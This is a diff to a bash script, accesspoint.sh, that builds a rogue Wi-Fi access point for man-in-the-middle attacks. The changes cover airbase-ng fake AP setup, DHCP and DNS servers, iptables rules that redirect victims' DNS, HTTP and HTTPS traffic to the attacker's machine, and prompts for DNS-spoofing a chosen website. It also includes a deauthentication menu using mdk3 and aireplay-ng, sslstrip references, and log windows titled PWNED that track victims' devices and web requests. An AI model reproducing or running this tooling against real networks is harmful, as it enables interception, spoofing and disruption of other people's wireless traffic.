Ubuntu Support

+++ accesspoint.sh
@@ -5,24 +5,23 @@
 ####################
 # GLOBAL VARIABLES #
 ####################
-REVISION=044
+REVISION=045
 function todo(){
 echo "TODO LIST FOR NEWER REVISIONS"
 echo "- Fix For Ping Victim"
 echo "- Cleanup Errors On Script Exit"
-echo "- Move Apache Logs To Session Folder"
 }
 ####################
 #  CONFIG SECTION  #
 ####################
-AUTOMODE=TRUE            #You Can Set AutoMode To TRUE | FALSE
-at0IP=192.168.0.254      #ip address of moniface
-at0IPBLOCK=192.168.0.0   #subnet
-NETMASK=255.255.0.0      #subnetmask
-DHCPS=192.168.0.0        #dhcp start range
-DHCPE=192.168.254.254    #dhcp end range
-BROADCAST=192.168.0.255  #broadcast address
-DHCPL=1h                 #time for dhcp lease
+AUTOMODE=FALSE             #You Can Set AutoMode To TRUE | FALSE
+at0IP=192.168.10.254       #ip address of moniface
+at0IPBLOCK=192.168.10.0    #subnet
+NETMASK=255.255.255.0      #subnetmask
+DHCPS=192.168.10.1         #dhcp start range
+DHCPE=192.168.10.250       #dhcp end range
+BROADCAST=192.168.10.255   #broadcast address
+DHCPL=1h                   #time for dhcp lease
 folder=`pwd`/SESSION_$RANDOM
 sslstrip=`which sslstrip`
 ######################
@@ -36,8 +35,8 @@ verbose=0
 ATHIFACE=wlan0
 ESSID=WiFi
 CHAN=1
-MTU=1800
-PPS=500
+MTU=1500
+PPS=100
 BEAINT=50
 WIFILIST=
 OTHEROPTS=
@@ -55,19 +54,25 @@ echo "CTRL+C Was Pressed..."
 echo ""
 stopshit
 monitormodestop
+kill `cat $folder/probe.pid` &>/dev/null
+kill `cat $folder/pwned.pid` &>/dev/null
+kill `cat $folder/web.pid` &>/dev/null
 cleanup
 exit 0
 }
 trap control_c SIGINT
 function cleanup(){
 rm -rf $folder
+mv $APACHECONF/default~ $APACHECONF/default
+dhcpconf=/etc/dhcp3/dhcpd.conf
+echo > $dhcpconf
+echo > /etc/dnsmasq.conf
+mv /etc/resolv.conf~ /etc/resolv.conf
 }
 function pinginternet(){
-echo "c:\>ping 8.8.8.8 -w 10"
-echo ""
-echo "Pinging Google [8.8.8.8] with 64 bytes of data:"
-INTERNETTEST=$(ping 8.8.8.8 -c 1 -W 10 | awk '/bytes from/ { print $5 }')
-if [ "$INTERNETTEST" = "icmp_seq=1" ]; then echo "Reply from 8.8.8.8: bytes=64"; else echo "Request timed out."; fi
+echo "| Pinging Google [8.8.8.8] with 64 bytes of data:"
+INTERNETTEST=$(awk '/bytes from/ { print $5 }' < <(ping 8.8.8.8 -c 1 -w 10))
+if [ "$INTERNETTEST" = "icmp_seq=1" ]; then echo "| Reply from 8.8.8.8: bytes=64"; else echo "| Request timed out."; fi
 }
 function pinggateway(){
 GATEWAYRDNS=$(route | awk '/UG/ { print $2 }')
@@ -76,15 +81,18 @@ echo "c:\>ping $GATEWAY -w 10"
 echo ""
 echo "Pinging $GATEWAYRDNS [$GATEWAY] with 64 bytes of data:"
 GATEWAYTEST=$(ping $GATEWAY -c 1 -W 10 | awk '/bytes from/ { print $5 }')
-if [ "$GATEWAYTEST" = "icmp_seq=1" ]; then echo "Reply from $GATEWAY: bytes=64"; else echo "Request timed out."; fi
+if [ "$GATEWAYTEST" = "icmp_seq=1" ]; then echo "| Reply from $GATEWAY: bytes=64"; else echo "| Request timed out."; fi
 }
 function pingvictim(){
 echo "Pinging $VICTIMRDNS [$VICTIM] with 64 bytes of data:"
 ping $VICTIM -c 20 -W 1 | awk '/bytes from/ { print $5 }'
 }
 function checkupdate(){
+echo "#####################################"
+echo "# RUNNING SCRIPT UPDATE CHECK       #"
+echo "#####################################"
 pinginternet
-if [ "$INTERNETTEST" != "icmp_seq=1" ]; then echo "[$FAIL] No Internet Connection";
+if [ "$INTERNETTEST" != "icmp_seq=1" ]; then echo "| [$FAIL] No Internet Connection";
 else
 newrevision=$(curl -s -B -L https://raw.github.com/CanadianJeff/BackTrack-5-Scripts/master/README | grep REVISION= | cut -d'=' -f2)
 if [ "$newrevision" -gt "$REVISION" ]; then update; fi
@@ -112,6 +120,7 @@ function stopshit(){
 service apache2 stop &>/dev/null
 service dhcp3-server stop &>/dev/null
 service dnsmasq stop &>/dev/null
+service network-manager stop &>/dev/null
 killall -9 aircrack-ng airodump-ng aireplay-ng airbase-ng wireshark mdk3 dnsmasq driftnet urlsnarf dsniff &>/dev/null
 killall -9 dhclient dhclient3 NetworkManager wpa_supplicant &>/dev/null
 iptables --flush
@@ -131,13 +140,12 @@ replace INTERFACES=\"\" INTERFACES=\"at0\" -- /etc/default/dhcp3-server
 echo "" > /var/lib/dhcp3/dhcpd.leases
 mkdir -p /var/run/dhcpd && chown dhcpd:dhcpd /var/run/dhcpd;
 dhcpconf=/etc/dhcp3/dhcpd.conf
-echo "one-lease-per-client false;"
-echo "default-lease-time 60;" > $dhcpconf
-echo "max-lease-time 72;" >> $dhcpconf
 echo "ddns-update-style none;" >> $dhcpconf
+echo "default-lease-time 600;" > $dhcpconf
+echo "max-lease-time 7200;" >> $dhcpconf
 echo "" >> $dhcpconf
 echo "log-facility local7;" >> $dhcpconf
-echo "local7.* $folder/dhcpd.log" > /etc/rsyslog.d/dhcpd.conf
+#echo "local7.* $folder/dhcpd.log" > /etc/rsyslog.d/dhcpd.conf
 echo "" >> $dhcpconf
 echo "authoritative;" >> $dhcpconf
 echo "" >> $dhcpconf
@@ -150,6 +158,7 @@ echo "option domain-name-servers $at0IP;" >> $dhcpconf
 echo "option routers $at0IP;" >> $dhcpconf
 echo "range $DHCPS $DHCPE;" >> $dhcpconf
 echo "allow unknown-clients;" >> $dhcpconf
+echo "one-lease-per-client false;" >> $dhcpconf
 echo "}" >> $dhcpconf
 # echo "}" >> $dhcpconf
 gnome-terminal --geometry=130x15 --hide-menubar --title=DHCP-"$ESSID" -e \
@@ -165,13 +174,15 @@ echo "localise-queries" >> /etc/dnsmasq.conf
 echo "log-queries" >> /etc/dnsmasq.conf
 echo "log-dhcp" >> /etc/dnsmasq.conf
 echo "" >> /etc/dnsmasq.conf
-echo "interface=at0" >> /etc/dnsmasq.conf
+# echo "interface=at0" >> /etc/dnsmasq.conf
 echo "dhcp-leasefile=$folder/dnsmasq.leases" >> /etc/dnsmasq.conf
-echo "resolv-file=$folder/resolv.conf.auto" >> /etc/dnsmasq.conf
+echo "resolv-file=$folder/resolv.conf" >> /etc/dnsmasq.conf
 echo "stop-dns-rebind" >> /etc/dnsmasq.conf
 # echo "rebind-localhost-ok" >> /etc/dnsmasq.conf
 echo "dhcp-range=$DHCPS,$DHCPE,$NETMASK,$DHCPL" >> /etc/dnsmasq.conf
 echo "dhcp-option=wirelesslan,3,$at0IP" >> /etc/dnsmasq.conf
+echo "dhcp-host=$MAC,$at0IP" >> /etc/dnsmasq.conf
+echo "nameserver $at0IP" > $folder/resolv.conf
 if [ "$mode" = "1" ]; then startdnsmasq; fi
 if [ "$mode" = "2" ]; then startdnsmasqresolv; fi
 
@@ -221,22 +232,22 @@ sleep 2
 }
 function monitormodestart(){
 airmon-ng check kill > $folder/monitormodepslist.txt
+ifconfig $ATHIFACE down
+iwconfig $ATHIFACE channel $CHAN
 ifconfig $ATHIFACE up
 echo "+===================================+"
 echo "| ATTEMPTING TO START (monitor-mode) ON $ATHIFACE"
 echo "+===================================+"
 airmon-ng start $ATHIFACE > $folder/monitormode.txt
-echo "| saved to $folder/monitormode.txt"
 MONIFACE=`awk '/enabled/ { print $5 }' $folder/monitormode.txt | head -c -2`
-iwconfig $ATHIFACE channel $CHAN
-iwconfig $MONIFACE channel $CHAN
-if [ "$SPOOFMAC" != "" ]; then
 ifconfig $MONIFACE down
 sleep 2
+iwconfig $MONIFACE channel $CHAN
+if [ "$SPOOFMAC" != "" ]; then
 macchanger -m $SPOOFMAC $MONIFACE
-ifconfig $MONIFACE up
 fi
-echo "| Monitor Mode Enabled On $MONIFACE On Channel $CHAN"
+ifconfig $MONIFACE up
+echo "| Monitor Mode Enabled On $MONIFACE (CH: $CHAN)"
 echo "+===================================+"
 }
 function poisonmenu(){
@@ -322,16 +333,20 @@ echo "Not Using A Local DHCP Server For MitM"
 function taillogs(){
 echo > /var/log/syslog
 # for (i=9; i<=NF; i++)
-echo "awk '/directed/ {printf(\"TIME: %s | MAC: %s | TYPE: PROBE REQUEST | IP: 000.000.000.000 | ESSID: %s %s %s %s %s %s %s\n\", \$1, \$7, \$9, \$10, \$11, \$12, \$13, \$14, \$15)}' < <(tail -f $folder/airbaseng.log)" > probe.sh
-echo "awk '/Client/ {printf(\"TIME: %s | MAC: %s | TYPE: CONNECTEDTOAP | IP: 000.000.000.000 | ESSID: %s %s %s %s %s %s %s\n\", \$1, \$3, \$8, \$9, \$10, \$11, \$12, \$13, \$14)}' < <(tail -f $folder/airbaseng.log) &" > pwned.sh
-echo "awk '/DHCPACK\\(at0\\)/ {printf(\"TIME: %s | MAC: %s | TYPE: DHCP ACK [OK] | IP: %s | HOSTNAME: %s\n\", \$3, \$9, \$8, \$10)}' < <(tail -f /var/log/syslog)" >> pwned.sh
-echo "awk '/-/ {printf(\"TIME: %s | MAC: 00:00:00:00:00:00 | TYPE: WEB HTTP REQU | IP: %s | HOSTNAME: $VICTHOST | %s\n\", substr(\$4,14), \$1, \$6, \$11, \$7, \$8)}' < <(tail -f $folder/access.log)" > web.sh
-chmod a+x probe.sh
-chmod a+x pwned.sh
-chmod a+x web.sh
-gnome-terminal --geometry=134x35 --hide-menubar --title=WEB -e "/bin/bash web.sh"
-gnome-terminal --geometry=134x17 --hide-menubar --title=PWNED -e "/bin/bash pwned.sh"
-gnome-terminal --geometry=134x17 --hide-menubar --title=PROBE -e "/bin/bash probe.sh"
+echo "echo \$$ > $folder/probe.pid" > $folder/probe.sh
+echo "awk '/directed/ {printf(\"TIME: %s | MAC: %s | TYPE: PROBE REQUEST | IP: 000.000.000.000 | ESSID: %s %s %s %s %s %s %s\n\", \$1, \$7, \$9, \$10, \$11, \$12, \$13, \$14, \$15)}' < <(tail -f $folder/airbaseng.log)" >> $folder/probe.sh
+echo "echo \$$ > $folder/pwned.pid" > $folder/pwned.sh
+echo "awk '/associated/ {printf(\"TIME: %s | MAC: %s | TYPE: CONNECTEDTOAP | IP: 000.000.000.000 | ESSID: %s %s %s %s %s %s %s\n\", \$1, \$3, \$8, \$9, \$10, \$11, \$12, \$13, \$14)}' < <(tail -f $folder/airbaseng.log) &" >> $folder/pwned.sh
+echo "awk '/DHCPACK\\(at0\\)/ {printf(\"TIME: %s | MAC: %s | TYPE: DHCP ACK [OK] | IP: %s | HOSTNAME: %s\n\", \$3, \$9, \$8, \$10)}' < <(tail -f /var/log/syslog)" >> $folder/pwned.sh
+echo "echo \$$ > $folder/web.pid" > $folder/web.sh
+#echo "awk '/GET/ {printf(\"TIME: %s | TYPE: WEB HTTP REQU | IP: %s | %s: %s | %s %s %s\n\", substr(\$4,14), \$1, \$9, \$11, \$6, \$7, \$8)}' < <(tail -f $folder/access.log)" >> $folder/web.sh
+echo "awk '/GET/ {printf(\"TIME: %s | IP: %s | %s: %s | %s %s %s\n\", substr(\$4,14), \$1, \$9, \$11, \$6, \$7, \$8)}' < <(tail -f $folder/access.log)" >> $folder/web.sh
+chmod a+x $folder/probe.sh
+chmod a+x $folder/pwned.sh
+chmod a+x $folder/web.sh
+gnome-terminal --geometry=134x35 --hide-menubar --title=WEB -e "/bin/bash $folder/web.sh"
+gnome-terminal --geometry=134x17 --hide-menubar --title=PWNED -e "/bin/bash $folder/pwned.sh"
+gnome-terminal --geometry=134x17 --hide-menubar --title=PROBE -e "/bin/bash $folder/probe.sh"
 #VICTIMMAC=awk '{printf("$2")}' < <(`tail -f dnsmasq.leases`)
 #VICTIMIP=
 #VICTHOST=$(awk '/$VICTIMMAC/ {printf("$4")}')
@@ -348,11 +363,10 @@ echo "a/$MAC|any" > $folder/droprules.txt
 echo "d/any|any" >> $folder/droprules.txt
 echo "$MAC" > $folder/whitelist.txt
 isempty=$(ls -l $folder | awk '/scannedwifimaclist.txt/ {print $5}')
-read -e -p "Deauth Count " COUNT
 read -e -p "List of APs (wifilist.txt) *optional* " WIFILIST
 echo ""
 echo "+===================================+"
-echo "| DEAUTH PEOPLE FOR $COUNT SECONDS   "
+echo "| DEAUTH PEOPLE                      "
 echo "+===================================+"
 echo "| 1) MDK3 | Murder Death Kill III    "
 echo "| 2) AIREPLAY-NG | Aircrack-NG Suite "
@@ -622,6 +636,9 @@ done
 # +===================================+
 # | ANYTHING ABOVE THIS IS UNTESTED   |
 # +===================================+
+mydistro="`awk '{print $1}' /etc/issue`"
+myversion="`awk '{print $2}' /etc/issue`"
+myrelease="`awk '{print $3}' /etc/issue`"
 # Dep Check
 echo "#####################################"
 echo "# REVISION: $REVISION                     #"
@@ -629,12 +646,15 @@ echo "#####################################"
 echo ""
 checkupdate
 echo ""
-todo
+echo "#####################################"
+if [ "$mydistro" = "BackTrack" ]; then echo "$mydistro Version $myversion Release $myrelease"; fi
+if [ "$mydistro" = "Ubuntu" ]; then echo "$mydistro Version $myversion Release $myrelease"; fi
+echo "#####################################"
 echo ""
 echo "+===================================+"
 echo "| Dependency Check                  |"
 echo "+===================================+"
-mydns="`which /usr/sbin/dnsmasq 2> /dev/null`"; if [ "$mydns" != "" ]; then
+mydns="`which dnsmasq 2> /dev/null`"; if [ "$mydns" != "" ]; then
 echo "| [$OK] $mydns"
 else
 echo "| [$FAIL] /usr/sbin/dnsmasq"
@@ -645,8 +665,9 @@ read -e -p "Please Connect To The Internet Now And Press Enter" enter
 apt-get install dnsmasq -y -q
 echo "| Done"
 fi
-mydhcpd="`which /usr/sbin/dhcpd3 2> /dev/null`"; if [ "$mydhcpd" != "" ]; then
-echo "| [$OK] $mydhcpd"
+if [ "$mydistro" = "BackTrack" ]; then mydhcpd="`which dhcpd3 2> /dev/null`"; fi 
+if [ "$mydistro" != "BackTrack" ]; then mydhcpd="`which dhcpd 2> /dev/null`"; fi
+if [ "$mydhcpd" != "" ]; then echo "| [$OK] $mydhcpd";
 else
 echo "| [$FAIL] /usr/sbin/dhcpd3"
 echo "|"
@@ -674,20 +695,8 @@ type -P python &>/dev/null || { echo "| [$FAIL] python";}
 type -P macchanger &>/dev/null || { echo "| [$FAIL] macchanger";}
 type -P msfconsole &>/dev/null || { echo "| [$FAIL] metasploit";}
 # apt-get install python-dev
-stopshit
-mydistro="`awk '{print $1}' /etc/issue`"
-myversion="`awk '{print $2}' /etc/issue`"
-myrelease="`awk '{print $3}' /etc/issue`"
-if [ "$mydistro" != "BackTrack" ]; then
-echo "|"
-echo "| WARNING BACKTRACK NOT DETECTED!!!!"
-echo "| RUNNING SCRIPT IN VERBOSE MODE!!!!"
-verbose=2
-else
-echo "|"
-echo "| $mydistro Version $myversion Release $myrelease"
-fi
 echo "+===================================+"
+stopshit
 modprobe tun
 echo ""
 if [ "$AUTOMODE" = "FALSE" ]; then poisonmenu; fi
@@ -716,17 +725,17 @@ read -e -p "What SSID Do You Want To Use [WiFi]: " ESSID
 if [ "$ESSID" = "" ]; then ESSID=WiFi; fi
 read -e -p "What CHANNEL Do You Want To Use [1]: " CHAN
 if [ "$CHAN" = "" ]; then CHAN=1; fi
-read -e -p "Select your MTU setting [1800]: " MTU
-if [ "$MTU" = "" ]; then MTU=1800; fi
+read -e -p "Select your MTU setting [1500]: " MTU
+if [ "$MTU" = "" ]; then MTU=1500; fi
 if [ "$MODE" = "4" ]; then 
 read -e -p "Targets MAC Address: " TARGETMAC
 fi
 read -e -p "Beacon Intervals [50]: " BEAINT
 if [ "$BEAINT" = "" ]; then BEAINT=50; fi
 if [ "$BEAINT" -lt "10" ]; then BEAINT=50; fi
-read -e -p "Packets Per Second [1000]: " PPS
-if [ "$PPS" = "" ]; then PPS=1000; fi
-if [ "$PPS" -lt "100" ]; then PPS=1000; fi
+read -e -p "Packets Per Second [100]: " PPS
+if [ "$PPS" = "" ]; then PPS=100; fi
+if [ "$PPS" -lt "100" ]; then PPS=100; fi
 read -e -p "Other AirBase-NG Options [none]: " OTHEROPTS
 read -e -p "DNS Spoof What Website [#]: " DNSURL
 if [ "$DNSURL" = "" ]; then DNSURL=\#; fi
@@ -748,12 +757,14 @@ echo "| BEACON INTERVAL: $BEAINT "
 echo "| MONITOR INTERFACE: $MONIFACE "
 fi
 echo "+===================================+"
-airbase-ng -a $MAC -c $CHAN -x $PPS -I $BEAINT -e "$ESSID" $OTHEROPTS $MONIFACE -P -C 120 -v > $folder/airbaseng.log &
+airbase-ng -a $MAC -c $CHAN -x $PPS -I $BEAINT $OTHEROPTS $MONIFACE -P -C 15 -v > $folder/airbaseng.log &
+#airbase-ng -a $MAC -c $CHAN -x $PPS -I $BEAINT -e "$ESSID" $OTHEROPTS $MONIFACE -P -C 120 -v > $folder/airbaseng.log &
 sleep 4
 ifconfig at0 up
 ifconfig at0 $at0IP netmask $NETMASK
 ifconfig at0 mtu $MTU
-route add -net $at0IPBLOCK netmask $NETMASK gw $at0IP
+# route add -net 169.254.0.0 netmask 255.255.0.0 gw 0.0.0.0
+# route add -net $at0IPBLOCK netmask $NETMASK gw $at0IP
 echo "+===================================+"
 if [ "$DHCPSERVER" = "1" ]; then dnsmasqserver; fi
 if [ "$DHCPSERVER" = "2" ]; then dhcpd3server; fi
@@ -762,20 +773,32 @@ if [ "$DHCPSERVER" = "4" ]; then nodhcpserver; fi
 echo "+===================================+"
 if [ "$mode" = "1" ]; then
 service apache2 stop > /dev/null
-ERRORFILE=$(ls /var/www/index* | awk '{ print $1 }')
-echo "ErrorDocument 404 $ERRORFILE" > /etc/apache2/conf.d/localized-error-pages
+ERRORFILE=$(awk '/index/ { print $1 }' < <(ls /var/www))
+if [ "$ERRORFILE" = "" ]; then ERRORFILE=index.php; fi
+echo "ErrorDocument 404 /$ERRORFILE" > /etc/apache2/conf.d/localized-error-pages
 echo > /var/log/apache2/access.log
 echo > /var/log/apache2/error.log
-ln -s /var/log/apache2/access.log $folder/access.log
-ln -s /var/log/apache2/error.log $folder/error.log
+APACHECONF=/etc/apache2/sites-available
+if [ -f $APACHECONF/default~ ]; then cp $APACHECONF/default~ $APACHECONF/default;
+else cp $APACHECONF/default $APACHECONF/default~; fi
+replace ${APACHE_LOG_DIR} $folder/ -- $APACHECONF/default &>/dev/null
+replace /var/log/apache2/ $folder/ -- $APACHECONF/default &>/dev/null
 service apache2 start > /dev/null
 firewall
-iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to-destination $at0IP
-iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination $at0IP
-iptables -t nat -A PREROUTING -p tcp --dport 67 -j DNAT --to-destination $at0IP
-iptables -t nat -A PREROUTING -p udp --dport 67 -j DNAT --to-destination $at0IP
-iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $at0IP
-iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $at0IP
+iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to-destination $at0IP:53
+iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination $at0IP:53
+#iptables -t nat -A PREROUTING -p tcp --dport 67 -j DNAT --to-destination $at0IP:67
+#iptables -t nat -A PREROUTING -p udp --dport 67 -j DNAT --to-destination $at0IP:67
+#iptables -t nat -A PREROUTING -p tcp --dport 68 -j DNAT --to-destination $at0IP:68
+#iptables -t nat -A PREROUTING -p udp --dport 68 -j DNAT --to-destination $at0IP:68
+iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $at0IP:80
+iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $at0IP:443
+cp /etc/resolv.conf /etc/resolv.conf~
+chmod a+w /etc/resolv.conf
+echo "# Generated by accesspoint.sh" > /etc/resolv.conf
+echo "nameserver $GATEWAY" >> /etc/resolv.conf
+echo "nameserver $at0IP" >> /etc/resolv.conf
+chmod a-w /etc/resolv.conf
 echo "+===================================+"
 echo "| APACHE2 WEB SERVER!!!             |"
 echo "+===================================+"
@@ -808,12 +831,13 @@ echo ""
 echo "ATEMPTING TO END ATTACK..."
 stopshit
 monitormodestop
-#if [ "$DHCPSERVER" = "1" ]; then killall -9 dnsmasq; fi
-if [ "$DHCPSERVER" = "2" ]; then
-kill `cat /var/run/dhcpd/at0.pid`
-fi
+kill `cat $folder/probe.pid`
+kill `cat $folder/pwned.pid`
+kill `cat $folder/web.pid`
+cleanup
+if [ "$DHCPSERVER" = "1" ]; then killall -9 dnsmasq; fi
+if [ "$DHCPSERVER" = "2" ]; then kill `cat /var/run/dhcpd/at0.pid`; fi
 if [ "$DHCPSERVER" = "3" ]; then killall -9 udhcpd; fi
-if [ "$AUTOMODE" = "FALSE" ]; then cleanup; fi
 #firefox http://www.hackerbusters.ca/
 read -e -p "DONE THANKS FOR PLAYING YOU MAY NOW CLOSE THIS WINDOW "
 fi
